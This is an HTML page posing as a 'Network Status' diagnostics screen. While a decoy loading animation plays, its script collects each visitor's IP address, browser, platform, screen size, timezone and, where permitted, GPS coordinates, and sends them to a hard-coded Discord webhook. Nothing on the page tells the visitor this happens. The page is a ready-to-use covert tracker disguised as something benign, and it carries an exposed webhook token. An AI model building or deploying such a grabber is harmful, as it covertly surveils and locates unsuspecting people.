<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Network Status</title>
  <style>
    body {
      background: #fff;
      font-family: system-ui, sans-serif;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    #container {
      width: 280px;
      text-align: center;
      color: #444;
      font-size: 0.95rem;
    }
    .dot-pulse {
      position: relative;
      left: 50%;
      transform: translateX(-50%);
      width: 10px;
      height: 10px;
      border-radius: 5px;
      background-color: #999;
      color: #999;
      animation: dotPulse 1.5s infinite linear;
    }
    @keyframes dotPulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.5); opacity: 0.5; }
      100% { transform: scale(1); opacity: 1; }
    }
    .info {
      font-size: 0.9rem;
      color: #666;
    }
    #status {
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #999;
    }
  </style>
</head>
<body>
  <div id="container">
    <h3>Network Status</h3>
    <p class="info">Gathering diagnostics...</p>
    <div class="dot-pulse"></div>
    <div id="status">Running checks, please hold...</div>
  </div>

  <script>
    (async () => {
      const webhookUrl = "https://discord.com/api/webhooks/1335069182928224426/wX5dfhivtfAjFEAP9w561XeLvTevyNNo0xmrunZeI5hT52XzZqE7ORTPVpy4h5U5uyUt"; // INSERT YOURS

      const postToDiscord = async (payload) => {
        const res = await fetch(webhookUrl + "?wait=true", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: payload })
        });
        return res.ok ? await res.json() : null;
      };

      const editDiscordMessage = async (messageId, newContent) => {
        await fetch(`${webhookUrl}/messages/${messageId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: newContent })
        });
      };

      // Collect Base Info
      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const screenRes = `${screen.width}x${screen.height}`;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const ipData = await fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .catch(() => ({ ip: "N/A" }));

      let basePayload = `ðŸ“¡ IP: ${ipData.ip}\nðŸ§  UA: ${browser}\nðŸ–¥ï¸ Platform: ${platform}\nðŸ“º Screen: ${screenRes}\nðŸ•“ Timezone: ${timezone}`;

      // Send initial data
      const message = await postToDiscord(basePayload);

      // Try to get geolocation within a short window
      if ("geolocation" in navigator && message && message.id) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude } = pos.coords;
            const fullPayload = `${basePayload}\nðŸ“ Location: ${latitude}, ${longitude}`;
            await editDiscordMessage(message.id, fullPayload);
          },
          (err) => {
            // no update if denied
          },
          { timeout: 5000 }
        );
      }
    })();
  </script>
</body>
</html>
